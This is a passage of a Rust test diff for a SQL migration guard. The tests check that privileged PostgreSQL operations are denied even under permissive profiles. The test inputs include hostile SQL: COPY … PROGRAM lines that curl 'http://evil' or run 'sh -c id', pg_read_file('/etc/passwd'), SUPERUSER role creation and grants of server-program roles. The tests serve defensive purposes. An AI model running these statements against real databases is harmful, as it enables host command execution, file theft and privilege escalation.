+        g.check(PLATFORM_ROLE_DO).is_ok(),
+        "platform role DO should pass under Platform: {:?}",
+        g.check(PLATFORM_ROLE_DO)
+    );
+}
+
+#[test]
+fn t4b_neg_do_block_privileged_ddl_denied_under_confined() {
+    let g = confined_guard();
+    assert!(
+        is_denied(&g, BOOTSTRAP_DO),
+        "0025 bootstrap DO must DENY under Confined"
+    );
+    assert!(
+        is_denied(&g, PLATFORM_ROLE_DO),
+        "platform role DO must DENY under Confined"
+    );
+}
+
+#[test]
+fn t4b_neg_do_block_rce_denied_even_under_platform() {
+    let g = platform_guard();
+    let rce_do = "DO $$ BEGIN
+        EXECUTE 'COPY zero_migrate.t FROM PROGRAM ''curl http://evil''';
+    END $$;";
+    assert!(
+        is_denied(&g, rce_do),
+        "COPY…PROGRAM in a body MUST deny even under Platform"
+    );
+}
+
+// ---- SUPERUSER is host-reaching, denied even under Platform. A prior bug: the
+// CreateRoleStmt arm returned Ok(()) unconditionally under Platform, so `CREATE
+// ROLE x SUPERUSER` PASSED — a render-here-refuse-at-guard backstop that did not
+// actually refuse. ----------------------------------------------------------
+
+#[test]
+fn superuser_role_denied_even_under_platform() {
+    let g = platform_guard();
+    // A plain role create is fine under Platform (the platform mints roles).
+    assert!(
+        g.check(r#"CREATE ROLE "zero_migrate_auth" LOGIN"#).is_ok(),
+        "a non-superuser CREATE ROLE must still pass under Platform: {:?}",
+        g.check(r#"CREATE ROLE "zero_migrate_auth" LOGIN"#)
+    );
+    // But SUPERUSER reaches the host — denied even under Platform, with the
+    // dedicated rule id (NOT the generic role_management, which Platform
+    // relaxes).
+    for sql in [
+        r#"CREATE ROLE "evil" SUPERUSER"#,
+        r#"CREATE ROLE "evil" LOGIN SUPERUSER BYPASSRLS"#,
+        r#"ALTER ROLE "zero_migrate_auth" SUPERUSER"#,
+    ] {
+        match g.check(sql) {
+            Err(GuardError::Denied { rule: r, .. }) => assert_eq!(
+                r,
+                rule::SUPERUSER_ROLE,
+                "SUPERUSER must deny with the superuser_role rule, got rule={r} for {sql}"
+            ),
+            other => {
+                panic!("SUPERUSER must be DENIED even under Platform; got {other:?} for {sql}")
+            }
+        }
+    }
+    // NOSUPERUSER (the negative attribute) is not an escalation — it passes.
+    assert!(
+        g.check(r#"CREATE ROLE "zero_migrate_auth" NOSUPERUSER LOGIN"#)
+            .is_ok(),
+        "NOSUPERUSER must not trip the superuser deny"
+    );
+}
+
+#[test]
+fn superuser_role_in_if_not_exists_do_wrap_denied_even_under_platform() {
+    let g = platform_guard();
+    let sql = r#"DO $$ BEGIN
+        IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'evil') THEN
+            CREATE ROLE "evil" SUPERUSER;
+        END IF;
+    END $$"#;
+
+    match g.check(sql) {
+        Err(GuardError::Denied { rule: r, .. }) => assert!(
+            r == rule::SUPERUSER_ROLE || r == rule::BODY_INSPECTION,
+            "DO-wrapped SUPERUSER must deny via superuser/body rule, got rule={r}"
+        ),
+        other => panic!("DO-wrapped SUPERUSER must be DENIED under Platform; got {other:?}"),
+    }
+}
+
+#[test]
+fn vendor_if_not_exists_superuser_role_op_is_refused_under_platform() {
+    let guard_cfg = platform_guard_config();
+    let author = platform_author();
+    let op = zero_migrate_ir::ir::Op::CreateRole {
+        name: "evil".into(),
+        login: Some(true),
+        password: None,
+        bypass_rls: None,
+        create_role: None,
+        create_db: None,
+        superuser: Some(true),
+        in_role: None,
+        set_search_path: None,
+        if_not_exists: Some(true),
+    };
+
+    match author.lower_guarded(
+        &vendor_ir(op),
+        &guard_cfg,
+        &zero_migrate::render::lower::LiveSchema::default(),
+    ) {
+        Err(_) => {}
+        Ok((_steps, fragments)) => panic!(
+            "vendor createRole(superuser + ifNotExists) must be refused; got fragments={fragments:?}"
+        ),
+    }
+}
+
+#[test]
+fn superuser_role_in_platform_do_body_token_scan_is_denied() {
+    let g = platform_guard();
+    let sql = r"DO $$ BEGIN
+        EXECUTE format('ALTER ROLE %I SUPERUSER', 'zero_migrate_auth');
+    END $$";
+
+    match g.check(sql) {
+        Err(GuardError::Denied { rule: r, .. }) => assert!(
+            r == rule::SUPERUSER_ROLE || r == rule::BODY_INSPECTION,
+            "DO body SUPERUSER token must deny via superuser/body rule, got rule={r}"
+        ),
+        other => panic!("DO body SUPERUSER token must be DENIED under Platform; got {other:?}"),
+    }
+}
+
+// ---- Host-reaching built-in role membership grants are RCE-equivalent and
+// remain denied under Platform. A prior bug: the GrantStmt/GrantRoleStmt arm
+// returned Ok(()) immediately for Platform, so `GRANT pg_execute_server_program
+// TO …` passed.
+
+#[test]
+fn host_escape_role_grant_denied_even_under_platform() {
+    let g = platform_guard();
+    assert!(
+        g.check(r"GRANT SELECT ON TABLE zero_migrate.app_secrets TO zero_migrate_app")
+            .is_ok(),
+        "benign table GRANT must still pass under Platform"
+    );
+
+    for sql in [
+        r"GRANT pg_execute_server_program TO zero_migrate_app",
+        r#"GRANT "pg_read_server_files" TO zero_migrate_app"#,
+        r"GRANT zero_migrate_app TO pg_write_server_files",
+    ] {
+        assert!(
+            is_denied(&g, sql),
+            "host-reaching built-in role membership grant must be DENIED even under Platform: {sql}"
+        );
+    }
+}
+
+// ---- raw vendor bodies still hit gate 2 ----
+
+#[test]
+fn vendor_create_function_body_rce_is_denied_under_platform_guard() {
+    let guard_cfg = platform_guard_config();
+    let author = platform_author();
+    let op = zero_migrate_ir::ir::Op::CreateFunction {
+        name: "audit_events_rce".into(),
+        schema: Some("zero_migrate".into()),
+        args: None,
+        returns: "void".into(),
+        language: zero_migrate_ir::ir::FuncLanguage::Procedural,
+        replace: Some(true),
+        volatility: None,
+        body: "BEGIN COPY zero_migrate.audit_events TO PROGRAM 'sh -c id'; END;".into(),
+    };
+
+    match author.lower_guarded(
+        &vendor_ir(op),
+        &guard_cfg,
+        &zero_migrate::render::lower::LiveSchema::default(),
+    ) {
+        Err(zero_migrate::render::lower::IrGuardedLowerError::Denied(denial)) => {
+            assert_eq!(denial.op_kind, "createFunction");
+            assert!(
+                matches!(
+                    denial.source,
+                    GuardError::Denied {
+                        rule: rule::BODY_INSPECTION,
+                        ..
+                    }
+                ),
+                "the PL/pgSQL body must be scanned, got: {:?}",
+                denial.source
+            );
+        }
+        other => panic!(
+            "vendor createFunction with COPY PROGRAM in its body must be denied; got {other:?}"
+        ),
+    }
+}
+
+#[test]
+fn vendor_create_function_benign_body_is_allowed_under_platform_guard() {
+    let guard_cfg = platform_guard_config();
+    let author = platform_author();
+    let op = zero_migrate_ir::ir::Op::CreateFunction {
+        name: "audit_events_note".into(),
+        schema: Some("zero_migrate".into()),
+        args: None,
+        returns: "void".into(),
+        language: zero_migrate_ir::ir::FuncLanguage::Procedural,
+        replace: Some(true),
+        volatility: None,
+        body: "BEGIN RAISE NOTICE 'ok'; RETURN; END;".into(),
+    };
+
+    let (_steps, fragments) = author
+        .lower_guarded(
+            &vendor_ir(op),
+            &guard_cfg,
+            &zero_migrate::render::lower::LiveSchema::default(),
+        )
+        .expect("benign vendor createFunction body must pass the Platform guard");
+    assert_eq!(fragments.len(), 1);
+    assert_eq!(fragments[0].op_kind, "createFunction");
+    assert!(
+        fragments[0].sql.contains("RAISE NOTICE 'ok'"),
+        "the guarded fragment should be the rendered function statement: {:?}",
+        fragments[0]
+    );
+}
+
+#[test]
+fn vendor_raw_rce_is_denied_under_platform_guard() {
+    let guard_cfg = platform_guard_config();
+    let author = platform_author();
+    let op = zero_migrate_ir::ir::Op::Raw {
+        sql: "COPY zero_migrate.audit_events TO PROGRAM 'sh -c id'".into(),
+        reason: "raw COPY PROGRAM denial regression".into(),
+    };
+
+    match author.lower_guarded(
+        &vendor_ir(op),
+        &guard_cfg,
+        &zero_migrate::render::lower::LiveSchema::default(),
+    ) {
+        Err(zero_migrate::render::lower::IrGuardedLowerError::Denied(denial)) => {
+            assert_eq!(denial.op_kind, "raw");
+            assert!(
+                matches!(
+                    denial.source,
+                    GuardError::Denied {
+                        rule: rule::COPY_PROGRAM,
+                        ..
+                    }
+                ),
+                "raw COPY PROGRAM should be caught by the AST deny-list, got: {:?}",
+                denial.source
+            );
+        }
+        other => panic!("vendor raw COPY PROGRAM must be denied; got {other:?}"),
+    }
+}
+
+#[test]
+fn vendor_role_op_is_refused_at_lower_without_platform_capability() {
+    let guard_cfg = confined_guard_config();
+    let author = zero_migrate::render::lower::IrAuthor::new(
+        zero_migrate::shipping_vendors(),
+        "zero_migrate",
+        "app_corpus",
+        &POSTGRES,
+        &crate::support::no_inject("app"),
+    );
+    let op = zero_migrate_ir::ir::Op::CreateRole {
+        name: "zero_migrate_auth".into(),
+        login: Some(true),
+        password: None,
+        bypass_rls: None,
+        create_role: None,
+        create_db: None,
+        superuser: None,
+        in_role: None,
+        set_search_path: None,
+        if_not_exists: None,
+    };
+
+    match author.lower_guarded(
+        &vendor_ir(op),
+        &guard_cfg,
+        &zero_migrate::render::lower::LiveSchema::default(),
+    ) {
+        Err(zero_migrate::render::lower::IrGuardedLowerError::Lower(
+            zero_migrate::render::lower::IrLowerError::VendorCapabilityDenied { op, capability },
+        )) => {
+            assert_eq!(op, "createRole");
+            assert_eq!(
+                capability,
+                zero_migrate_ir::capability::VendorCapability::Role
+            );
+        }
+        other => panic!(
+            "vendor createRole must be refused at lower without Platform capability; got {other:?}"
+        ),
+    }
+}
+
+#[test]
+fn benign_vendor_policy_is_refused_at_lower_without_capability() {
+    let guard_cfg = confined_guard_config();
+    let author = zero_migrate::render::lower::IrAuthor::new(
+        zero_migrate::shipping_vendors(),
+        "zero_migrate",
+        "app_corpus",
+        &POSTGRES,
+        &crate::support::no_inject("app"),
+    );
+    let op = zero_migrate_ir::ir::Op::CreatePolicy {
+        name: "tenant_isolation".into(),
+        table: "app_secrets".into(),
+        schema: None,
+        for_cmd: zero_migrate_ir::ir::PolicyCmd::All,
+        to: None,
+        using: zero_migrate_ir::expr::Expr::Literal {
+            value: zero_migrate_ir::ir::IrScalar::Bool(true),
+        },
+        with_check: None,
+    };
+
+    assert!(
+        matches!(
+            author.lower_guarded(
+                &vendor_ir(op),
+                &guard_cfg,
+                &zero_migrate::render::lower::LiveSchema::default(),
+            ),
+            Err(zero_migrate::render::lower::IrGuardedLowerError::Lower(_))
+        ),
+        "lower_guarded must re-enforce the vendor capability gate before rendering; \
+         the SQL guard alone would allow a benign same-schema CREATE POLICY"
+    );
+}
+
+// ---- SchemaScope Single is byte-identical at the read sites ---------
+
+#[test]
+fn t2_func_def_target_single_is_byte_identical() {
+    let g = confined_guard(); // Single("zero_migrate")
+                              // own-schema funcname → OK; foreign funcname → CrossSchema.
+    assert!(g
+        .check("CREATE FUNCTION zero_migrate.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
+        .is_ok());
+    assert!(matches!(
+        g.check("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$"),
+        Err(GuardError::CrossSchema { .. })
+    ));
+    assert!(matches!(
+        g.check("ALTER FUNCTION control.f() IMMUTABLE"),
+        Err(GuardError::CrossSchema { .. })
+    ));
+}
+
+#[test]
+fn t2_literal_schema_refs_single_is_byte_identical() {
+    let g = confined_guard(); // Single("zero_migrate")
+    assert!(matches!(
+        g.check("SELECT 'control.t'::regclass"),
+        Err(GuardError::CrossSchema { .. })
+    ));
+    assert!(matches!(
+        g.check("SELECT nextval('control.s')"),
+        Err(GuardError::CrossSchema { .. })
+    ));
+    // own-schema literal ref → OK.
+    assert!(g.check("SELECT nextval('zero_migrate.s')").is_ok());
+}
+
+#[test]
+fn t2_platform_func_def_and_literal_refs_respect_allowlist() {
+    let g = platform_guard(); // Allowlist(zero_migrate, public)
+                              // allowlisted schema → OK
+    assert!(g
+        .check("CREATE FUNCTION public.f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$")
+        .is_ok());
+    assert!(g.check("SELECT nextval('public.s')").is_ok());
+    // non-allowlisted (creator) schema → still CrossSchema
+    assert!(matches!(
+        g.check("SELECT 'proj_acme.t'::regclass"),
+        Err(GuardError::CrossSchema { .. })
+    ));
+}
+
+#[test]
+fn schema_scope_permits_is_case_insensitive() {
+    assert!(SchemaScope::Single("Zero_migrate".into()).permits("zero_migrate"));
+    assert!(SchemaScope::Allowlist(vec!["PubLic".into()]).permits("public"));
+    assert!(!SchemaScope::Single("zero_migrate".into()).permits("control"));
+}
+
+// ---- The widest composable charter: an UNCONFINED operator ---------------
+//
+// These fixtures were the Trusted profile: this same charter, plus the root/host-set
+// mode that turned the whole deny-list belt off. Only the mode is gone. What remains
+// is the most permissive posture a charter can compose — `access.role` and
+// `schema.cross_schema` granted over the whole universe — and it is a posture a real
+// operator charter reaches, which is exactly why the tests below are worth keeping
+// pointed at it: they measure how far the composable grants widen the guard, now that
+// no posture can switch the guard off.
+
+/// A guard over the unconfined operator charter, built straight from a composed
+/// `EffectivePolicy` like every other guard here.
+fn unconfined_operator_guard() -> SqlGuard {
+    SqlGuard::new(unconfined_operator_guard_config())
+}
+
+fn unconfined_operator_guard_config() -> GuardConfig {
+    GuardConfig::from_policy(
+        crate::support::operator_with_data_security(&[], &[], false, DestructiveOps::Allow),
+        POSTGRES,
+    )
+}
+
+/// The unconfined peer of [`platform_author`]: the author composes the same charter
+/// `unconfined_operator_guard_config` does, because the charter is what grants a
+/// vendor capability.
+fn unconfined_operator_author() -> zero_migrate::render::lower::IrAuthor {
+    zero_migrate::render::lower::IrAuthor::new(
+        zero_migrate::shipping_vendors(),
+        "public",
+        "app_corpus",
+        &POSTGRES,
+        &crate::support::operator_with_data_security(&[], &[], false, DestructiveOps::Allow),
+    )
+}
+
+/// How far the widest charter widens, and where it STOPS.
+///
+/// This test used to assert that EVERY one of these passed, because the belt-off
+/// posture skipped the deny-list entirely. Removing that posture is a behaviour change
+/// and this is where it is measured. What the charter genuinely grants — role
+/// management under `access.role`, a write outside the project schema under a
+/// whole-universe `schema.cross_schema` — still passes. Everything else is now
+/// REFUSED where the belt-off posture applied it: the host-reach rules (ALTER SYSTEM,
+/// COPY … TO PROGRAM, the file-reading function), an extension the charter never
+/// granted, and a GRANT to a host-reaching built-in role, which is hard-denied in
+/// every profile because Platform widens privilege WITHIN the database and never
+/// host reach.
+///
+/// The Confined column was this test's precondition and is unchanged: every one of
+/// these is a hard Confined denial.
+#[test]
+fn the_unconfined_operator_charter_widens_the_grants_and_nothing_else() {
+    let unconfined = unconfined_operator_guard();
+    let confined = confined_guard();
+    // (sql, does the unconfined operator charter admit it?)
+    let arbitrary = [
+        ("CREATE ROLE zsmig_arbitrary NOLOGIN", true),
+        ("CREATE TABLE other_schema.t (id int)", true),
+        ("GRANT ALL ON SCHEMA public TO postgres", false),
+        ("ALTER SYSTEM SET wal_level = minimal", false),
+        ("COPY t TO PROGRAM 'sh -c id'", false),
+        ("SELECT pg_read_file('/etc/passwd')", false),
+        ("CREATE EXTENSION dblink", false),
+    ];
+    for (sql, admitted) in arbitrary {
+        assert!(
+            confined.check(sql).is_err(),
+            "precondition: Confined must DENY {sql} for this test to be meaningful"
+        );
+        assert_eq!(
+            unconfined.check(sql).is_ok(),
+            admitted,
+            "the unconfined operator charter's decision on {sql} changed\n  got: {:?}",
+            unconfined.check(sql)
+        );
+    }
+}
+
+/// The destructive flag is derived from `classify`, independent of what the charter
+/// grants: a `DROP TABLE` the guard admits still reports `destructive`, and
+/// `flags_for` still sets `requires_approval` — so a caller's `--yes` gate holds.
+#[test]
+fn an_admitted_destructive_op_still_requires_approval() {
+    let g = unconfined_operator_guard();
+    let report = g
+        .check("DROP TABLE users")
+        .expect("the unconfined operator charter must not deny a DROP TABLE");
+    assert!(report.destructive, "DROP TABLE is destructive");
+    let flags = flags_for(&report);
+    assert!(flags.destructive);
+    assert!(
+        flags.requires_approval,
+        "a destructive op still requires approval (CLI --yes)"
+    );
+}
+
+/// A raw island creating a SUPERUSER role is refused however wide the charter is.
+///
+/// The refusal used to come from `check_raw_island_sql`, the narrower backstop
+/// `lower_guarded` ran INSTEAD of the belt for the belt-off posture. There is no
+/// belt-off posture, so it comes from the belt itself now — the same rule, from the
+/// door that is actually open.
+#[test]
+fn a_raw_island_creating_a_superuser_role_is_refused() {
+    let cfg = unconfined_operator_guard_config();
+    let author = unconfined_operator_author();
+    let bad = zero_migrate_ir::ir::Op::Raw {
+        sql: "CREATE ROLE zsmig_raw_evil SUPERUSER".into(),
+        reason: "raw SUPERUSER denial regression".into(),
+    };
+
+    match author.lower_guarded(
+        &vendor_ir(bad),
+        &cfg,
+        &zero_migrate::render::lower::LiveSchema::default(),
+    ) {
+        Err(zero_migrate::render::lower::IrGuardedLowerError::Denied(denial)) => {
+            assert_eq!(denial.op_kind, "raw");
+            assert!(
+                matches!(
+                    denial.source,
+                    GuardError::Denied {
+                        rule: rule::SUPERUSER_ROLE,
+                        ..
+                    }
+                ),
+                "a raw island creating a SUPERUSER role must be denied, got {:?}",
+                denial.source
+            );
+        }
+        other => panic!("a raw island creating a SUPERUSER role must be denied; got {other:?}"),
+    }
+
+    let clean = zero_migrate_ir::ir::Op::Raw {
+        sql: "SELECT 1".into(),
+        reason: "clean raw island smoke test".into(),
+    };
+    author
+        .lower_guarded(
+            &vendor_ir(clean),
+            &cfg,
+            &zero_migrate::render::lower::LiveSchema::default(),
+        )
+        .expect("a clean raw island should pass");
+}
+
+/// A `createFunction` body that shells out is refused however wide the charter is —
+/// the peer of [`a_raw_island_creating_a_superuser_role_is_refused`], and refused now
+/// by the belt rather than by the body backstop `lower_guarded` used to substitute for
+/// the belt-off posture.
+#[test]
+fn a_create_function_body_that_shells_out_is_refused() {
+    let cfg = unconfined_operator_guard_config();
+    let author = unconfined_operator_author();
+    let bad = zero_migrate_ir::ir::Op::CreateFunction {
+        name: "raw_body_evil".into(),
+        schema: Some("public".into()),
+        args: None,
+        returns: "void".into(),
+        language: zero_migrate_ir::ir::FuncLanguage::Procedural,
+        replace: Some(true),
+        volatility: None,
+        body: "BEGIN COPY public.audit_events TO PROGRAM 'sh -c id'; END;".into(),
+    };
+
+    match author.lower_guarded(
+        &vendor_ir(bad),
+        &cfg,
+        &zero_migrate::render::lower::LiveSchema::default(),
+    ) {
+        Err(zero_migrate::render::lower::IrGuardedLowerError::Denied(denial)) => {
+            assert_eq!(denial.op_kind, "createFunction");
+            assert!(
+                matches!(
+                    denial.source,
+                    GuardError::Denied {
+                        rule: rule::BODY_INSPECTION,
+                        ..
+                    }
+                ),
+                "the createFunction body must be scanned, got {:?}",
+                denial.source
+            );
+        }
+        other => panic!("a COPY … TO PROGRAM function body must deny; got {other:?}"),
+    }
+
+    let clean = zero_migrate_ir::ir::Op::CreateFunction {
+        name: "raw_body_clean".into(),
+        schema: Some("public".into()),
+        args: None,
+        returns: "void".into(),
+        language: zero_migrate_ir::ir::FuncLanguage::Procedural,
+        replace: Some(true),
+        volatility: None,
+        body: "BEGIN RAISE NOTICE 'ok'; RETURN; END;".into(),
+    };
+    author
+        .lower_guarded(
+            &vendor_ir(clean),
+            &cfg,
+            &zero_migrate::render::lower::LiveSchema::default(),
+        )
+        .expect("a clean createFunction body should pass");
+}
+
+/// Platform's widening is real and BOUNDED: it admits the privileged role op Confined
+/// denies, and still denies a cross-schema write outside its allowlist.
+///
+/// The framing was "the belt-off early-return is gated on Trusted only, so neither of
+/// these two leaks it". The early-return is gone, so there is nothing left to leak —
+/// but each of the three assertions is a statement about Confined or Platform on its
+/// own terms, and every one of them still holds and is still worth holding.
+#[test]
+fn platform_widening_is_real_and_bounded() {
+    // Confined: the privileged op is denied.
+    let confined = confined_guard();
+    assert!(
+        is_denied(&confined, "CREATE ROLE zsmig_x NOLOGIN"),
+        "Confined must deny CREATE ROLE"
+    );
+    // Platform: a privileged-but-bounded op APPLIES, and a NON-allowlisted
+    // cross-schema op DENIES.
+    let platform = platform_guard();
+    assert!(
+        platform
+            .check("CREATE ROLE zero_migrate_auth NOLOGIN")
+            .is_ok(),
+        "Platform widening intact"
+    );
+    assert!(
+        is_denied(&platform, "CREATE TABLE proj_acme.steal(id int)"),
+        "Platform must deny a cross-schema op outside its allowlist"
+    );
+}
+
+// ---------------------------------------------------------------------------
+// What a descriptor-only vendor's EMPTY guard does NOT cover.
+// ---------------------------------------------------------------------------
+
+/// `destructive_ops = forbid` is enforced for every non-PostgreSQL id, and it is
+/// enforced HERE — over the structured IR. The two shipping descriptor guards trust
+/// everything they are handed; a future backend must not be able to opt itself out.
+///
+/// # Why this test exists
+///
+/// `zero_migrate_sqlite::SqliteGuard::check` and `zero_migrate_mysql::MysqlGuard::check`
+/// both return `Ok(GuardOutcome::default())`. Read on its own, either one says "this
+/// dialect vets nothing", and the obvious conclusion — that the two dialects have no
+/// data-security posture, and that this arm of `check_ir_data_security_policy` is dead
+/// code for them — is exactly backwards. The arm exists BECAUSE those guards are empty
+/// and are constructed without the policy, so nothing else can read the knob for them.
+///
+/// Every one of the sibling `destructive_ops` tests above runs at
+/// the PostgreSQL identity, where the denial comes from the SQL-TEXT deny-list instead.
+/// So before this test, deleting the gate left the whole suite green while silently
+/// making `forbid` inert on two of the three shipping dialects — the precise
+/// regression the posture was added to fix.
+///
+/// The gate WAS `cfg.dialect() != &POSTGRES` — core deciding a security posture by
+/// naming one vendor. It is `!guard.refuses_destructive_ops_itself()` now, and the
+/// equivalent regression this test still catches is a backend answering `true` while
+/// refusing nothing: SQLite and MySQL answer `false` because their guards are
+/// constructed without the policy, and the fourth-backend stub answers `false` for
+/// itself rather than being covered by not being a named id.
+///
+/// PostgreSQL is asserted alongside as the CONTROL, and deliberately with the OPPOSITE
+/// assertion: this arm must NOT fire there, because PostgreSQL's denial comes from the
+/// text guard. A change that made the arm fire for every dialect would satisfy the loop
+/// and fail the control.
+/// A stand-in for a backend nobody has written yet — the guard a fourth vendor would
+/// have to supply, since `MigrationGuard` has no default body on any method.
+///
+/// EXACTLY ONE method answers, and which one is the point.
+/// `refuses_destructive_ops_itself` is the question the destructive-posture gate now
+/// asks, and `false` is the answer a backend gives when its own guard cannot read
+/// `data_security.destructive_ops` — which is every backend that has not written the
+/// refusal. That is what keeps the neutral walk below enforcing the knob for it.
+///
+/// Every OTHER method panics rather than answering, because the gate decides from the
+/// structured IR and this guard's one answer; a panic here means the walk started
+/// asking a vendor questions on a path that is supposed to need none.
+///
+/// The gate used to be `cfg.dialect() != &POSTGRES`, so this stub answered nothing at
+/// all and the fourth backend was covered by not being one named id. It is covered by
+/// its own answer now, which is strictly more of what this file exists to prove.
+struct FourthBackendGuard;
+
+impl MigrationGuard for FourthBackendGuard {
+    fn check(&self, _up: &str) -> Result<zero_migrate::guard::GuardOutcome, GuardError> {
+        unreachable!("the destructive-posture gate decides before any SQL text is vetted")
+    }
+    fn check_raw_island_sql(&self, _sql: &str) -> Result<(), GuardError> {
+        unreachable!("this IR carries no raw island")
+    }
+    fn check_raw_island_body(&self, _body: &str, _raw: &str) -> Result<(), GuardError> {
+        unreachable!("this IR carries no raw function body")
+    }
+    fn raw_island_escapes_rls_net_state(&self, _sql: &str) -> bool {
+        unreachable!("this IR carries no raw island, and no require_rls obligation")
+    }
+    /// The one answer. See the type doc for why it is `false` and why that is not a
+    /// stub's convenience.
+    fn refuses_destructive_ops_itself(&self) -> bool {
+        false
+    }
+    fn flags_for_sql(
+        &self,
+        _up: &str,
+    ) -> Result<zero_migrate::model::migration::MigrationFlags, GuardError> {
+        unreachable!("the IR walk never derives flags from SQL text")
+    }
+}
+
+#[test]
+fn destructive_ops_forbid_is_enforced_over_the_ir_for_every_non_postgres_id() {
+    let ir = ir_with(vec![Op::DropTable {
+        table: "users".to_string(),
+        schema: None,
+        existence_guard: None,
+        cascade: None,
+    }]);
+    let policy =
+        || crate::support::no_inject_with_data_security("public", false, DestructiveOps::Forbid);
+
+    for dialect in [SQLITE, MYSQL, DialectId::new("duckdb")] {
+        let cfg = GuardConfig::from_policy(policy(), dialect.clone());
+        // `duckdb` is not a REGISTERED backend — that is the point of including it. It
+        // stands for a fourth backend that has not been written yet, and it proves the
+        // gate below asks the GUARD rather than matching a closed set of ids. The
+        // registry cannot resolve it (`guard_for` panics on an unregistered id), so it
+        // brings the guard a fourth backend would have to write for itself, including
+        // the `refuses_destructive_ops_itself` answer that decides this gate.
+        let guard: Box<dyn MigrationGuard> = if dialect == DialectId::new("duckdb") {
+            Box::new(FourthBackendGuard)
+        } else {
+            zero_migrate::guard_for(zero_migrate::shipping_vendors(), &cfg)
+        };
+        let err = check_ir_data_security_policy(&cfg, &ir, guard.as_ref()).expect_err(
+            "a trusting MigrationGuard means this IR walk is the dialect's ONLY \
+             destructive_ops=forbid enforcement - it must deny a dropTable",
+        );
+        assert_eq!(err.op_index, 0, "{dialect:?}");
+        assert!(
+            matches!(
+                err.source,
+                GuardError::DataSecurityPolicy {
+                    rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
+                    ..
+                }
+            ),
+            "{dialect:?} must deny under DESTRUCTIVE_OPS_FORBID, got: {:?}",
+            err.source
+        );
+    }
+
+    let pg = GuardConfig::from_policy(policy(), POSTGRES);
+    assert!(
+        check_ir_data_security_policy(
+            &pg,
+            &ir,
+            zero_migrate::guard_for(zero_migrate::shipping_vendors(), &pg).as_ref()
+        )
+        .is_ok(),
+        "the IR arm is for the dialects whose guard cannot read the knob; PostgreSQL's \
+         denial comes from SqlGuard::check over the rendered SQL"
+    );
+}
